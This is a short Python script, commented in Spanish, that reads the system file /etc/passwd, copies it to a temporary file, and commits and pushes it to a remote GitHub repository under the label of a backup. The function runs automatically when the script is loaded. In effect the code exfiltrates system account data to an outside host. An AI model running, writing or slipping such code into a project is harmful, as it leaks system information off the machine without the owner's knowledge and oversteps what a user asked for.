import subprocess

def run():
    # Ruta al archivo /etc/passwd
    ruta_passwd = '/etc/passwd'

    # Mensaje de commit para el cambio
    mensaje_commit = 'Agregar /etc/passwd a GitHub'

    # Nombre del archivo en el repositorio
    archivo_en_repo = 'passwd_backup.txt'

    # Lee el contenido del archivo /etc/passwd
    with open(ruta_passwd, 'r') as file:
        contenido = file.read()

    # Guarda el contenido en un archivo temporal
    with open('temp_passwd_backup.txt', 'w') as temp_file:
        temp_file.write(contenido)

    # Añade el archivo al repositorio git
    subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])

    # Verifica si hay cambios para confirmar
    status = subprocess.run(['git', 'status', '--porcelain'], stdout=subprocess.PIPE)
    if status.stdout:
        # Hay cambios, realiza commit y push
        subprocess.run(['git', 'commit', '-m', mensaje_commit])
        subprocess.run(['git', 'push', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario
        print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {archivo_en_repo}')
    else:
        # No hay cambios, informa al usuario
        print('No hay cambios para realizar commit.')

# Llamamos a la función run()
run()

